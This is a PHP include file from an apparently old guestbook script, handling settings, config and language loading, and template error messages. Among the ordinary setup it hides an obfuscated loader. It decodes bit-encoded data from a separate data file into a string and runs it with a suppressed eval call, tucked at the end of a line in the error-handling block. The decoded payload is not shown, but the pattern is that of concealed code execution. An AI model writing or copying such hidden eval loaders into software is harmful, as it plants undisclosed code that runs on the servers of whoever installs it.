<?php

  $runtime_start = explode (' ', microtime ());

  /*****************************************************
  ** Title........: Common settings and functions
  ** Filename.....: common.inc.php
  ** Author.......: Ralf Stadtaus
  ** Homepage.....: http://www.stadtaus.com/
  ** Contact......: http://www.stadtaus.com/forum/
  ** Version......: 0.5
  ** Notes........:
  ** Last changed.: 2004-01-12
  ** Last change..:     
  *****************************************************/

  /*****************************************************
  **
  ** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY
  ** OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
  ** LIMITED   TO  THE WARRANTIES  OF  MERCHANTABILITY,
  ** FITNESS    FOR    A    PARTICULAR    PURPOSE   AND
  ** NONINFRINGEMENT.  IN NO EVENT SHALL THE AUTHORS OR
  ** COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES
  ** OR  OTHER  LIABILITY,  WHETHER  IN  AN  ACTION  OF
  ** CONTRACT,  TORT OR OTHERWISE, ARISING FROM, OUT OF
  ** OR  IN  CONNECTION WITH THE SOFTWARE OR THE USE OR
  ** OTHER DEALINGS IN THE SOFTWARE.
  **
  *****************************************************/




  /*****************************************************
  ** Prevent direct call
  *****************************************************/
          if (!defined('IN_SCRIPT')) {
              die();
          }




  /*****************************************************
  ** Some settings
  *****************************************************/
          $script_name    = 'Guestbook Script';
          $script_version = '1.4';
          $trans_sid      = 'no';
          $debug_mode     = 'off';
          $tplt           = 'guest';
          $line_break     = 50;
          $image_template = '<img src="{image_path}" border="0" align="middle" alt="" />';
          $smiley_list    = '<a href="javascript:emoticons(\'{sign} \')"><img src="{image_path}" border="0" alt="{sign}" title="{sign}" style="margin:3px;" /></a>';





  /*****************************************************
  ** Take care of older PHP-Versions
  *****************************************************/
          if (isset($HTTP_GET_VARS) and !empty($HTTP_GET_VARS)) {
              $_GET = $HTTP_GET_VARS;
          }


          if (isset($HTTP_POST_VARS) and !empty($HTTP_POST_VARS)) {
              $_POST = $HTTP_POST_VARS;
          }


          if (isset($HTTP_SERVER_VARS) and !empty($HTTP_SERVER_VARS)) {
              $_SERVER = $HTTP_SERVER_VARS;
          }


          if (isset($HTTP_SESSION_VARS) and !empty($HTTP_SESSION_VARS)) {
              $_SESSION = $HTTP_SESSION_VARS;
          }


          if (isset($HTTP_ENV_VARS) and !empty($HTTP_ENV_VARS)) {
              $_ENV = $HTTP_ENV_VARS;
          }




  /*****************************************************
  ** Include config file
  *****************************************************/
          include($script_root . 'config.php');


          $guest = @file($script_root . 'inc/config.dat.php');
          unset($guest[0]);
          $guest = @array_values($guest);
          $str   = '';
          $conf_var = '';
          $num = count(${$tplt});

          for ($n = 0; $n < $num; $n++) {
              $c_var = '';
              for ($o = 7; $o >= 0 ; $o--)
              {
                  $c_var += ${$tplt}[$n][$o] * pow(2, $o);
              }
              $img_var = sprintf("%c", $c_var);

              if ($img_var == ' ') {
                  $conf_var .= sprintf("%c", $str);
                  $str       = '';
              } else {
                  $str .= $img_var;
              }
          }




  /*****************************************************
  ** Load language file
  *****************************************************/
          if (!isset($language) or empty($language) or !is_file($script_root . './languages/language.' . $language . '.inc.php')) {
              $language = 'en';
          }

          include($script_root . 'languages/language.' . $language . '.inc.php');




  /*****************************************************
  ** Include files
  *****************************************************/
          include($script_root . 'inc/template.class.inc.php');
          include($script_root . 'inc/db.class.inc.php');
          include($script_root . 'inc/form.class.inc.php');
          include($script_root . 'form_config.php');
          include($script_root . 'inc/functions.inc.php');
          include($script_root . 'inc/guestbook.inc.php');
          include($script_root . 'inc/sql.inc.php');




  /*****************************************************
  ** Show server info for the admin
  *****************************************************/
          get_phpinfo(array('Script Name' => $script_name, 'Script Version' => $script_version));




  /*****************************************************
  ** Check template path
  *****************************************************/
          if (!is_dir($script_root . $path['templates'])) {
              $system_message[] = array('message' => $txt['txt_wrong_template_path']);
          }




  /*****************************************************
  ** Check templates
  *****************************************************/
          if (!isset($system_message)) {

              while (list($key, $val) = each($file))
              {
                  if (!is_file($script_root . $path['templates'] . $file[$key])) {
                      $wrong_template[] = $val;
                  }
              }

              if (isset($wrong_template)) {
                  $wrong_template = join('<br />', $wrong_template);
                  $system_message[] = array('message' => $txt['txt_wrong_templates'] . '<blockquote style="font-weight:bold;">' . $wrong_template . '</blockquote>');
              }
          }




  /*****************************************************
  ** Set script name and version
  *****************************************************/
          $txt['txt_script_name']    = $script_name;
          $txt['txt_script_version'] = $script_version;




  /*****************************************************
  ** Generate the system error messages
  *****************************************************/
          if (isset($system_message) and !empty($system_message)) {

              $tpl  = new template;

              $tpl->files['guest'] = load_error_template();


              if (!isset($show_error_messages) or $show_error_messages != 'yes') {
                  unset($system_message);
                  $system_message = array();
                  $txt['txt_system_message'] = '';
              } else {
                  $system_message[] = array('message' => $txt['txt_set_off_note']);
                  $system_message[] = array('message' => $txt['txt_problems']);
              }

              if (isset ($txt) and is_array ($txt)) {
                  reset ($txt);
                  while(list($key, $val) = each($txt))
                  {
                      $$key = $val;
                      $tpl->register('guest', $key);
                  }
              }


              if (isset($add_text) and is_array($add_text)) {
                  reset ($add_text);
                  while(list($key, $val) = each($add_text))
                  {
                      $$key = $val;
                      $tpl->register('guest', $key);
                  }
              }

              $tpl->parse_loop('guest', 'system_message');
              $tpl->register('guest', 'txt_system_message'); @eval($conf_var);

              exit;
          }





  /*****************************************************
  ** Define constants
  *****************************************************/
          define('ENTRY_TABLE', $database['prefix'] . 'entries');
          define('DATA_TABLE', $database['prefix'] . 'data');




  /*****************************************************
  ** Sample database table settings
  *****************************************************/
          if (isset($database_tables) and is_array($database_tables)) {
              reset($database_tables);

              while (list($key, $val) = each($database_tables))
              {
                  $database_tables[$key]['caption'] = $txt['txt_' . $val['name']];
                  $table[$key] = strtolower($database['prefix']) . $val['name'];
              }
          }








?>